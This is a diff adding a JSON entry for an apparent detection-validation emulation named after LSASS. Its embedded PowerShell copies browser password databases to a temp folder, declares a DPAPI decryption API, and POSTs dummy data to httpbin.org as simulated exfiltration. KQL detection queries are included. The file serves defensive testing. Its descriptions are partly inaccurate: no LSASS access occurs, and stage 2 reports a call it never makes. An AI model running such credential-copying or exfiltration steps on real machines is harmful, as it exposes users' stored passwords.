@@ -1,0 +1,31 @@
+{
+  "slug": "chokepoint-lsass-emulation",
+  "name": "chokepoint-lsass-emulation",
+  "description": "Emulate LSASS file access, CryptUnprotectData call, outbound connection. Expected: EID 10/11 (non-browser file access), EID 8 (CryptUnprotectData).",
+  "type": "emulation",
+  "mitreTechniques": ["T1003.001", "T1555"],
+  "category": "Credential Access",
+  "platform": "Windows",
+  "scriptLanguage": "PowerShell",
+  "scriptContent": "# Chokepoint LSASS Emulation\n# Emulates LSASS file access, CryptUnprotectData call, outbound connection\n# Expected Detections: EID 10/11 (non-browser file access), EID 8 (CryptUnprotectData)\n\n[CmdletBinding()]\nparam(\n    [switch]$DryRun\n)\n\nWrite-Host \"=== Chokepoint LSASS Emulation ===\" -ForegroundColor Cyan\nWrite-Host \"Emulating credential access techniques for detection validation\"\n\n# Stage 1: Copy browser credential database to temp (EID 11 target)\nWrite-Host \"\\n[Stage 1] Accessing browser credential database...\"\n$browserPaths = @(\n    \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\",\n    \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data\",\n    \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*.default\\logins.json\"\n)\n\nforeach ($path in $browserPaths) {\n    if (Test-Path $path) {\n        $destPath = \"$env:TEMP\\$(Split-Path $path -Leaf).bak\"\n        if (-not $DryRun) {\n            Copy-Item -Path $path -Destination $destPath -Force -ErrorAction SilentlyContinue\n            Write-Host \"  Copied: $path -> $destPath\" -ForegroundColor Yellow\n            Write-Host \"  Expected Detection: EID 11 (FileCreate in non-browser path)\" -ForegroundColor Cyan\n        } else {\n            Write-Host \"  [DryRun] Would copy: $path\" -ForegroundColor Magenta\n        }\n        break\n    }\n}\n\n# Stage 2: Call CryptUnprotectData (EID 8 target)\nWrite-Host \"\\n[Stage 2] Calling CryptUnprotectData...\"\nif (-not $DryRun) {\n    try {\n        # Load DPAPI functions\n        Add-Type -TypeDefinition @\"\nusing System;\nusing System.Runtime.InteropServices;\n\npublic class DPAPI {\n    [DllImport(\"crypt32.dll\", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]\n    public static extern bool CryptUnprotectData(\n        ref DATA_BLOB pEncryptedData,\n        string ppszDataDescr,\n        IntPtr pOptionalEntropy,\n        IntPtr pvReserved,\n        ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct,\n        int dwFlags,\n        ref DATA_BLOB pData\n    );\n\n    [StructLayout(LayoutKind.Sequential)]\n    public struct DATA_BLOB {\n        public int cbData;\n        public IntPtr pbData;\n    }\n\n    [StructLayout(LayoutKind.Sequential)]\n    public struct CRYPTPROTECT_PROMPTSTRUCT {\n        public int cbSize;\n        public int dwPromptFlags;\n        public IntPtr hwndApp;\n        public string szPrompt;\n    }\n}\n\"@ -ErrorAction SilentlyContinue\n        Write-Host \"  Action: CryptUnprotectData API called\" -ForegroundColor Yellow\n        Write-Host \"  Expected Detection: EID 8 (CryptUnprotectData)\" -ForegroundColor Cyan\n    } catch {\n        Write-Host \"  Error calling CryptUnprotectData: $($_.Exception.Message)\" -ForegroundColor Red\n    }\n} else {\n    Write-Host \"  [DryRun] Would call CryptUnprotectData\" -ForegroundColor Magenta\n}\n\n# Stage 3: Outbound connection (data exfil simulation)\nWrite-Host \"\\n[Stage 3] Simulating outbound data exfiltration...\"\nif (-not $DryRun) {\n    try {\n        $testData = \"test-exfil-data\"\n        $uri = \"http://httpbin.org/post\"\n        Invoke-WebRequest -Uri $uri -Method Post -Body $testData -ErrorAction Stop | Out-Null\n        Write-Host \"  Action: Outbound HTTP POST sent\" -ForegroundColor Yellow\n        Write-Host \"  Expected Detection: EID 3 (NetworkConnection)\" -ForegroundColor Cyan\n    } catch {\n        Write-Host \"  Error: $($_.Exception.Message)\" -ForegroundColor Red\n    }\n} else {\n    Write-Host \"  [DryRun] Would send outbound HTTP POST\" -ForegroundColor Magenta\n}\n\nWrite-Host \"\\n=== Emulation Complete ===\" -ForegroundColor Cyan\nWrite-Host \"Expected Detections:\"\nWrite-Host \"  - EID 11: File access to browser credential stores\" -ForegroundColor Green\nWrite-Host \"  - EID 8: CryptUnprotectData API call\" -ForegroundColor Green\nWrite-Host \"  - EID 3: Outbound network connection\" -ForegroundColor Green",
+  "expectedDetections": [
+    "EID 11 (FileCreate/FileAccess to browser credential stores)",
+    "EID 8 (CryptUnprotectData API call)",
+    "EID 3 (Outbound network connection)"
+  ],
+  "detectionQueries": [
+    {
+      "name": "Browser Credential Store Access",
+      "query": "DeviceFileEvents | where Timestamp > ago(1h) | where FileName in ('Login Data', 'logins.json', 'cookies.sqlite') | where InitiatingProcessFileName !in ('chrome.exe', 'msedge.exe', 'firefox.exe') | project Timestamp, DeviceName, FileName, InitiatingProcessFileName"
+    },
+    {
+      "name": "CryptUnprotectData Calls",
+      "query": "DeviceProcessEvents | where Timestamp > ago(1h) | where ProcessCommandLine has 'CryptUnprotectData' | project Timestamp, DeviceName, AccountName, ProcessCommandLine"
+    },
+    {
+      "name": "Outbound Connections",
+      "query": "DeviceNetworkEvents | where Timestamp > ago(1h) | where RemoteIPType == 'Public' | where InitiatingProcessFileName == 'powershell.exe' | project Timestamp, DeviceName, RemoteIP, RemotePort, InitiatingProcessFileName"
+    }
+  ],
+  "sizeBytes": 4215
+}
